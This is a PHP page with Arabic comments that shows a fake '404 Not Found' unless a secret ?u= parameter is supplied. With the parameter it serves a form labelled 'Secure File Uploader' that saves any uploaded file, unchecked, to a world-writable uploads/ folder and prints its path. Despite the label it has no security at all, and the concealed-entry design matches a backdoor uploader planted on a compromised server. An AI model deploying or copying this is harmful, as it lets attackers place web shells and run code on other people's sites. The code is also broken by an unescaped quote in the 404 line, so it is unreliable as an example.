<?php
// التحقق من وجود البارامتر ?u=
if (!isset($_GET['u']) || empty($_GET['u'])) {
    // عرض رسالة Not Found
    http_response_code(404);
    echo "<h1 style="text-aling:center;">404 Not Found</h1>";
    exit;
}

// إذا كان البارامتر موجودًا، يتم عرض صفحة رفع الملفات
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure File Uploader</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            background-color: #f4f4f9;
        }
        .container {
            margin: 50px auto;
            padding: 20px;
            width: 90%;
            max-width: 400px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
        }
        h1 {
            color: #333;
        }
        input[type="file"] {
            margin: 20px 0;
        }
        button {
            background: #007BFF;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #0056b3;
        }
        .message {
            margin-top: 15px;
            color: #007BFF;
        }
        .error {
            color: #FF0000;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Secure File Uploader</h1>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" required>
            <br>
            <button type="submit" name="upload">Upload</button>
        </form>

        <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["upload"])) {
            $uploadDir = "uploads/";
            if (!is_dir($uploadDir)) {
                mkdir($uploadDir, 0777, true); // إنشاء المجلد إذا لم يكن موجودًا
            }

            $fileName = basename($_FILES["fileToUpload"]["name"]);
            $targetFile = $uploadDir . $fileName;

            try {
                // السماح برفع الملفات
                if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
                    echo "<p class='message'>File uploaded successfully: <strong>$fileName</strong></p>";
                    echo "<p class='message'>Path: <code>$targetFile</code></p>";
                } else {
                    throw new Exception("Error: File upload failed!");
                }
            } catch (Exception $e) {
                echo "<p class='error'>{$e->getMessage()}</p>";
            }
        }
        ?>
    </div>
</body>
</html>